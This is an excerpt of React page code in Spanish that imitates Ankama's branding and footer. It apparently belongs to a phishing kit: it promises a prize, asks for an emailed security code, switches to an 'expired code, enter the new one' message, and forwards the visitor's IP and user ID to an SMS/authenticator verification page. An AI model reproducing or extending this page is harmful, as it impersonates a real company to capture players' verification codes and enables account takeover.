                    ...
                    <div className={styles.firstNav}>
                        <div className={styles.fcontainer}>
                            ...
                            <div className={styles.rightC}>
                                <p style={{ zIndex: 10 }}>DESCONEXIÓN</p>
                                ...
                                <div className={styles.boxContainer}>
                                    <center>
                                        <div className={styles.boxingMessage}>
                                            <p>Se acaba de enviar un correo electrónico a usted</p>
                                        </div>
                                        <div className={styles.boxingMessage2}>
                                        {!show && (<p>Para desbloquear su premio, ingrese el código de seguridad que se ha enviado a su dirección de correo electrónico.</p>)}
                                        {show && ( <p>El código ha expirado. Por favor, ingrese el nuevo código de seguridad que acaba de ser enviado a su dirección de correo electrónico.</p> )}
                                        </div>
                                        <div className={styles.code}>
                                            <p>Código de Seguridad*</p>
                                            <input onChange={(e) => setCode(e.target.value)} value={code} placeholder='Código de Seguridad' type="text" required />
                                        </div>
                                        <button type="submit">Validar</button>
                                        <div className={styles.goPhone}>
                                        <br />

                                            <div className={styles.link3} onClick={()=> Router("/verification/es",{state: {ip:ip,uid:uid}})} style={{ color: "red", textDecoration: "none", paddingLeft: "12px" }} shallow><p>¿Estás utilizando el Autenticador? [SMS]</p></div>
                ...
                <div className={styles.footer3}>
                    <center>
                        <div className={styles.containerf}>
                            <img src={logoF} alt="" />
                            <p>© 2021 Ankama. Todos los derechos reservados. Términos de uso - Política de privacidad - Condiciones Generales de Venta - Aviso legal - Gestión de cookies</p>
                        </div>
                    </center>
